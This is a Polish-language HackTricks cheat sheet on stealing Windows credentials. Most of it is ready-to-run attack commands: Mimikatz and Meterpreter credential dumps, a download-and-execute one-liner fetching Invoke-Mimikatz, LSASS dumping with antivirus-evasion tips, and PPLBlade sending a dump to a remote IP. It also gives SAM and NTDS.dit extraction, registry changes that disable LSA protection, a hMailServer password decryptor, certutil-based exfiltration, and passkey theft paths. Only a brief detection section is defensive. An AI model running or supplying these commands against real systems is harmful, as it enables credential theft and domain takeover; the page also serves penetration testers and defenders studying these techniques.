# Kradzież poświadczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Poświadczenia Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Znajdź inne rzeczy, które Mimikatz może robić, na** [**tej stronie**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Dowiedz się tutaj o niektórych możliwych zabezpieczeniach poświadczeń.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatz wyodrębnienie niektórych poświadczeń.**

## Poświadczenia z Meterpreterem

Użyj utworzonego przeze mnie [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), aby **wyszukiwać hasła i hashe** wewnątrz zaatakowanego systemu.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Omijanie AV

### Procdump + Mimikatz

Ponieważ **Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **jest legalnym narzędziem Microsoft**, Defender go nie wykrywa.\
Możesz użyć tego narzędzia do **zrzucenia procesu lsass**, **pobrania dumpa** i **wyodrębnienia** **danych uwierzytelniających lokalnie** z dumpa.

Możesz także użyć [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ten proces jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre rozwiązania **AV** mogą **wykrywać** użycie **procdump.exe do dumpowania lsass.exe** jako **złośliwe**, ponieważ **wykrywają** ciągi **„procdump.exe” i „lsass.exe”**. Dlatego bardziej **stealthy** jest przekazanie jako **argumentu** **PID-u** lsass.exe do procdump, **zamiast** nazwy lsass.exe.

### Dumpowanie lsass za pomocą **comsvcs.dll**

Biblioteka DLL o nazwie **comsvcs.dll**, znajdująca się w `C:\Windows\System32`, odpowiada za **zrzucanie pamięci procesu** w przypadku awarii. Ta biblioteka DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, przeznaczoną do wywoływania za pomocą `rundll32.exe`.\
Użycie dwóch pierwszych argumentów nie ma znaczenia, natomiast trzeci jest podzielony na trzy elementy. Pierwszy element stanowi identyfikator procesu, który ma zostać zrzucony, drugi określa lokalizację pliku zrzutu, a trzeci musi być dokładnie słowem **full**. Nie istnieją alternatywne opcje.\
Po przeanalizowaniu tych trzech elementów biblioteka DLL tworzy plik zrzutu i przenosi do niego pamięć określonego procesu.\
Użycie **comsvcs.dll** umożliwia wykonanie dumpowania procesu lsass, eliminując tym samym konieczność przesyłania i uruchamiania procdump. Ta metoda została szczegółowo opisana na stronie [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Do wykonania używa się następującego polecenia:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Możesz zautomatyzować ten proces za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Zrzucanie lsass za pomocą Task Manager**

1. Kliknij prawym przyciskiem myszy pasek zadań i kliknij Task Manager
2. Kliknij Więcej szczegółów
3. Znajdź proces „Local Security Authority Process” na karcie Procesy
4. Kliknij prawym przyciskiem myszy proces „Local Security Authority Process” i kliknij „Utwórz plik zrzutu”.

### Zrzucanie lsass za pomocą procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to podpisany przez Microsoft plik binarny, który jest częścią pakietu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpowanie lsass za pomocą PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do dumpowania Protected Process, które obsługuje obfuskowanie dumpu pamięci i przesyłanie go do zdalnych stacji roboczych bez zapisywania go na dysku.

**Główne funkcje**:

1. Omijanie ochrony PPL
2. Obfuskowanie plików dumpu pamięci w celu uniknięcia mechanizmów wykrywania opartych na sygnaturach Defender
3. Przesyłanie dumpu pamięci za pomocą metod uploadu RAW i SMB bez zapisywania go na dysku (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – zrzucanie LSASS oparte na SSP bez MiniDumpWriteDump

Ink Dragon dostarcza trzyetapowy dumper o nazwie **LalsDumper**, który nigdy nie wywołuje `MiniDumpWriteDump`, dlatego hooki EDR na tym API nigdy się nie uruchamiają:<sup>[[3]](#references)</sup>

1. **Loader etapu 1 (`lals.exe`)** – wyszukuje w `fdp.dll` placeholder składający się z 32 małych liter `d`, zastępuje go absolutną ścieżką do `rtu.txt`, zapisuje spatchowaną bibliotekę DLL jako `nfdp.dll` i wywołuje `AddSecurityPackageA("nfdp","fdp")`. Wymusza to załadowanie przez **LSASS** złośliwej biblioteki DLL jako nowego Security Support Provider (SSP).
2. **Etap 2 wewnątrz LSASS** – gdy LSASS ładuje `nfdp.dll`, biblioteka DLL odczytuje `rtu.txt`, wykonuje XOR każdego bajtu z `0x20`, mapuje zdekodowany blob do pamięci, a następnie przekazuje do niego wykonanie.
3. **Dumper etapu 3** – zmapowany payload ponownie implementuje logikę MiniDump, używając **direct syscalls** rozwiązywanych na podstawie zahashowanych nazw API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany export o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, zapisuje skompresowany dump LSASS do pliku i zamyka uchwyt, aby exfiltration mogła nastąpić później.

Uwagi operatora:

* Umieść `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` w tym samym katalogu. Etap 1 zastępuje hard-coded placeholder absolutną ścieżką do `rtu.txt`, więc rozdzielenie tych plików przerywa cały łańcuch.
* Rejestracja odbywa się przez dopisanie `nfdp` do `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Możesz samodzielnie ustawić tę wartość, aby wymusić ponowne ładowanie SSP przez LSASS przy każdym uruchomieniu systemu.
* Pliki `%TEMP%\*.ddt` zawierają skompresowane dumpy. Rozpakuj je lokalnie, a następnie przekaż do Mimikatz/Volatility w celu ekstrakcji credentials.
* Uruchomienie `lals.exe` wymaga uprawnień administratora/SeTcb, aby `AddSecurityPackageA` zakończyło się powodzeniem; po powrocie z tego wywołania LSASS transparentnie ładuje rogue SSP i wykonuje etap 2.
* Usunięcie biblioteki DLL z dysku nie powoduje jej usunięcia z LSASS. Usuń wpis w rejestrze i zrestartuj LSASS (uruchom ponownie system) albo pozostaw go w celu long-term persistence.

## CrackMapExec

### Zrzut hashy SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dumpowanie sekretów LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Zrzut NTDS.dit z docelowego DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Zrzut historii haseł NTDS.dit z docelowego kontrolera domeny
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wyświetl atrybut pwdLastSet dla każdego konta NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kradzież SAM i SYSTEM

Pliki te powinny być **zlokalizowane** w _C:\windows\system32\config\SAM_ oraz _C:\windows\system32\config\SYSTEM._ Jednak **nie możesz po prostu skopiować ich w zwykły sposób**, ponieważ są chronione.

### Z rejestru

Najłatwiejszym sposobem na kradzież tych plików jest uzyskanie ich kopii z rejestru:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pobierz** te pliki na swoją maszynę z Kali i **wyodrębnij hashe** za pomocą:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Za pomocą tej usługi można kopiować chronione pliki. Wymagane są uprawnienia Administratora.

#### Using vssadmin

Plik binarny vssadmin jest dostępny tylko w wersjach Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ale możesz zrobić to samo z poziomu **Powershell**. Jest to przykład **kopiowania pliku SAM** (używany dysk twardy to „C:”, a plik jest zapisywany w C:\users\Public), ale możesz użyć tego do kopiowania dowolnego chronionego pliku:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kod z książki: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na koniec możesz również użyć [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby utworzyć kopię SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Poświadczenia Active Directory - NTDS.dit**

Plik **NTDS.dit** jest znany jako serce **Active Directory** i przechowuje kluczowe dane dotyczące obiektów użytkowników, grup oraz ich członkostwa. To w nim przechowywane są **hashe haseł** użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w lokalizacji **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych utrzymywane są trzy główne tabele:

- **Tabela danych**: odpowiada za przechowywanie szczegółów dotyczących obiektów, takich jak użytkownicy i grupy.
- **Tabela powiązań**: śledzi relacje, takie jak członkostwo w grupach.
- **Tabela SD**: przechowuje **deskryptory zabezpieczeń** dla każdego obiektu, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

Badania Christoffera Anderssona dotyczące warstwy bazy danych opisują te tabele i ich zachowanie zależne od wersji w większej szczegółowości.<sup>[[8]](#references)</sup>

Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a biblioteka ta jest używana przez _lsass.exe_. Następnie **część** pliku **NTDS.dit** może znajdować się w pamięci **`lsass`** (prawdopodobnie można znaleźć najnowsze uzyskane dane dzięki poprawie wydajności zapewnianej przez użycie **cache**).

#### Odszyfrowywanie hashy wewnątrz NTDS.dit

Hash jest szyfrowany trzy razy:

1. Odszyfrowanie klucza szyfrowania haseł (**PEK**) przy użyciu **BOOTKEY** i **RC4**.
2. Odszyfrowanie **hasha** przy użyciu **PEK** i **RC4**.
3. Odszyfrowanie **hasha** przy użyciu **DES**.

**PEK** ma **taką samą wartość na każdym kontrolerze domeny**, ale jest **zaszyfrowany** wewnątrz **NTDS.dit** przy użyciu specyficznego dla kontrolera domeny **BOOTKEY** z gałęzi **SYSTEM** tego kontrolera domeny. Dlatego wyodrębnianie poświadczeń wymaga zarówno pliku **NTDS.dit**, jak i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kopiowanie NTDS.dit przy użyciu Ntdsutil

Dostępne od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Możesz również użyć techniki [**volume shadow copy**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**zrzucić go z rejestru lub użyć techniki volume shadow copy**](#stealing-sam-and-system)).

### **Wyodrębnianie hashy z NTDS.dit**

Po **uzyskaniu** plików **NTDS.dit** i **SYSTEM** możesz użyć narzędzi takich jak _secretsdump.py_, aby **wyodrębnić hashe**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Możesz również **automatycznie je wyodrębnić** przy użyciu prawidłowego użytkownika administratora domeny:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
W przypadku **dużych plików NTDS.dit** zaleca się ich wyodrębnianie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na koniec można również użyć **modułu metasploit**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy danych SQLite**

Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, ale również całe obiekty i ich atrybuty, co umożliwia dalsze pozyskiwanie informacji, gdy surowy plik NTDS.dit został już pobrany.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive jest opcjonalny, ale umożliwia deszyfrowanie sekretów (hashy NT i LM, dodatkowych poświadczeń, takich jak hasła w cleartext, klucze kerberos lub trust, a także historii haseł NT i LM). Oprócz innych informacji wyodrębniane są następujące dane: konta użytkowników i komputerów wraz z ich hashami, flagi UAC, znacznik czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwo rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny wraz z typem, kierunkiem i atrybutami trustów...

## Lazagne

Pobierz binary z [here](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego binary do wyodrębniania credentials z kilku programów.
```
lazagne.exe all
```
## Inne narzędzia do wyodrębniania danych uwierzytelniających z SAM i LSASS

### Windows Credentials Editor (WCE)

To narzędzie może służyć do wyodrębniania danych uwierzytelniających z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wyodrębnianie danych uwierzytelniających z pliku SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Wyodrębnianie danych uwierzytelniających z pliku SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pobierz go ze strony:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i po prostu **uruchom go**, a hasła zostaną wyodrębnione.

## Mining idle RDP sessions and weakening security controls

RAT Ink Dragon’s FinalDraft zawiera tasker `DumpRDPHistory`, którego techniki są przydatne dla każdego red-teamera:<sup>[[3]](#references)</sup>

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – przeanalizuj każdy user hive pod adresem `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz przechowuje nazwę serwera, `UsernameHint` oraz timestamp ostatniej modyfikacji. Możesz odtworzyć logikę FinalDraft za pomocą PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – odpytywanie logu `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pod kątem Event IDs **21** (pomyślne logowanie) i **25** (rozłączenie) pozwala ustalić, kto administrował danym hostem:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Gdy już wiesz, który Domain Admin regularnie się łączy, wykonaj dump LSASS za pomocą LalsDumper/Mimikatz, dopóki jego **rozłączona** sesja nadal istnieje. CredSSP + NTLM fallback pozostawia w LSASS jego verifier i tokeny, które można następnie odtworzyć przez SMB/WinRM, aby pobrać `NTDS.dit` lub przygotować persistence na kontrolerach domeny.

### Registry downgrades targeted by FinalDraft

Ten sam implant manipuluje również kilkoma kluczami Registry, aby ułatwić credential theft:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Ustawienie `DisableRestrictedAdmin=1` wymusza pełne ponowne użycie poświadczeń/biletów podczas RDP, umożliwiając pivoty w stylu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` wyłącza filtrowanie tokenów UAC, dzięki czemu lokalni administratorzy otrzymują nieograniczone tokeny przez sieć.
* `DSRMAdminLogonBehavior=2` pozwala administratorowi DSRM logować się, gdy DC jest online, zapewniając attackerom inne wbudowane konto z wysokimi uprawnieniami.
* `RunAsPPL=0` usuwa ochronę LSASS PPL, sprawiając, że dostęp do pamięci staje się trywialny dla dumperów takich jak LalsDumper.

## Poświadczenia bazy danych hMailServer (po przejęciu)

hMailServer przechowuje hasło do DB w `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` w sekcji `[Database] Password=`. Wartość jest zaszyfrowana algorytmem Blowfish ze statycznym kluczem `THIS_KEY_IS_NOT_SECRET` i zamianą endianowości 4-bajtowych słów. Użyj ciągu szesnastkowego z pliku INI wraz z tym fragmentem Python:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Mając hasło w postaci jawnego tekstu, skopiuj bazę danych SQL CE, aby uniknąć blokad plików, załaduj dostawcę 32-bitowego i w razie potrzeby wykonaj upgrade przed odpytywaniem hashy:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Kolumna `accountpassword` używa formatu hashy hMailServer (tryb hashcat `1421`). Cracking tych wartości może dostarczyć wielokrotnego użytku credentials do pivotów WinRM/SSH.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Niektóre narzędzia przechwytują **plaintext logon passwords**, interceptując callback LSA logowania `LsaApLogonUserEx2`. Idea polega na hookowaniu lub opakowaniu callbacku pakietu uwierzytelniania, aby credentials były przechwytywane **podczas logowania** (przed hashowaniem), a następnie zapisywane na dysku lub zwracane operatorowi. Jest to powszechnie implementowane jako helper, który injectuje się do LSA lub rejestruje się w nim, a następnie zapisuje każde pomyślne zdarzenie interaktywnego/network logowania wraz z username, domain i password.<sup>[[1]](#references)</sup>

Uwagi operacyjne:
- Wymaga local admin/SYSTEM do załadowania helpera do ścieżki uwierzytelniania.
- Przechwycone credentials pojawiają się tylko wtedy, gdy nastąpi logowanie (interaktywne, RDP, service lub network logowanie — zależnie od hooka).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) przechowuje zapisane informacje o połączeniach w pliku `sqlstudio.bin` przypisanym do użytkownika. Dedykowane dumpers mogą przeparsować ten plik i odzyskać zapisane SQL credentials. W shellach, które zwracają wyłącznie output poleceń, plik jest często eksfiltrated przez zakodowanie go jako Base64 i wyświetlenie na stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Po stronie operatora odbuduj plik i uruchom lokalnie dumper, aby odzyskać dane uwierzytelniające:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Kradzież poświadczeń Passkeys / WebAuthn z Chrome w systemie Windows

Jeśli uzyskano możliwość wykonywania kodu jako **użytkownik będący ofiarą** na hoście Windows korzystającym z **Chrome + zsynchronizowanych passkeys w Google Password Manager**, passkeys stają się interesującym celem post-exploitation, nawet **bez uprawnień administratora/SYSTEM**.<sup>[[4]](#references)</sup>

### Interesujące lokalne artefakty
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** przechowuje zakodowane w formacie protobuf rekordy **`WebauthnCredentialSpecifics`**. Proces tego samego użytkownika może wyliczyć **RP ID**, **nazwę użytkownika**, **ID poświadczenia** oraz zaszyfrowany materiał klucza prywatnego zsynchronizowanych passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** przechowuje lokalny stan rejestracji urządzenia, taki jak **`wrapped_identity_private_key`** oraz opakowany sekret używany do odzyskiwania zsynchronizowanych poświadczeń.<sup>[[4]](#references)</sup>

Szybka analiza:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### Powiązane z TPM obiekty blob kluczy mogą nadal być wykorzystywane jako lokalny oracle podpisu

Jeśli przeglądarka eksportuje klucz tożsamości oparty na TPM jako **`NCRYPT_OPAQUE_KEY_BLOB`** i przechowuje ten obiekt blob w stanie dostępnym dla użytkownika, malware **nie musi wyodrębniać surowego klucza prywatnego**. Może po prostu ponownie zaimportować obiekt blob na **tej samej maszynie** i poprosić lokalny TPM o podpisanie danych kontrolowanych przez atakującego:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Oznacza to, że **hardware binding zapobiega eksportowi poza urządzenie, ale nie uniemożliwia użycia przez tego samego użytkownika na przejętym endpointcie**.

### Praktyczne ścieżki nadużycia

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Wylicz `WebauthnCredentialSpecifics` z Chrome LevelDB.
- Rozpocznij logowanie za pomocą passkey i uzyskaj świeże wyzwanie WebAuthn.
- Użyj skradzionego bloba `wrapped_identity_private_key` na TPM ofiary, aby podpisać binding żądania cloud-authenticator.
- Przekaż otrzymane assertion do relying party.
- Jest to szczególnie wartościowe, gdy RP akceptuje `userVerification=preferred` lub nie odrzuca assertion z **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- Wymuś ponowne onboardowanie, usuwając `passkey_enclave_state` lub wysyłając prawidłowo podpisaną operację `device/forget`.
- Jeśli onboardowanie pozostawi urządzenie w stanie **`uv_key_pending`**, zarejestruj kontrolowany przez atakującego publiczny klucz UV.
- Jeśli provider nie weryfikuje attestation / pochodzenia nowego klucza UV z secure hardware, późniejsze podpisy z klucza atakującego są traktowane jako **`UV=1`**.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Wymuś recovery lub ponowne dołączenie, aby Chrome pobrał zsynchronizowany master secret passkey.
- Obserwuj ponowne utworzenie lub modyfikację `passkey_enclave_state`, a następnie wykonaj dump pamięci Chrome, gdy jawny **security domain secret (SDS)** znajduje się w pamięci.
- Użyj odzyskanego SDS do odszyfrowania zaszyfrowanych pól w każdym rekordzie `WebauthnCredentialSpecifics` i odzyskania przenośnych kluczy prywatnych WebAuthn.

### Pomysły dotyczące DFIR / detekcji

- Monitoruj **usuwanie/ponowne tworzenie** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Generuj alerty dotyczące nietypowego dostępu procesów innych niż przeglądarka do **`Sync Data\LevelDB`** Chrome.
- Generuj alerty dotyczące **zrzutów pamięci Chrome** lub podejrzanego dostępu do pamięci między procesami.
- Badaj powtarzające się monity o **Google Password Manager recovery PIN** lub nieoczekiwane ponowne onboardowanie.
- Pamiętaj, że WebAuthn **`signCount`** często nie jest użyteczny w przypadku zsynchronizowanych passkey, ponieważ może pozostać stały, przez co klasyczne wykrywanie klonów jest słabe.

## References

- [1] [Unit 42 – Dochodzenie w sprawie wieloletnich, niewykrytych operacji wymierzonych w sektory o wysokiej wartości](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing z makrem Word VBA przez SMTP → odszyfrowanie poświadczeń hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci relay i wewnętrznego działania ukrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: nowa powierzchnia ataku w uwierzytelnianiu bez haseł](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / magazyn kluczy CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jak naprawdę działa magazyn danych Active Directory: wewnątrz NTDS.dit (część 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – zdalny dump haseł LSASS](https://en.hackndo.com/remote-lsass-dump-passwords)
{{#include ../../banners/hacktricks-training.md}}
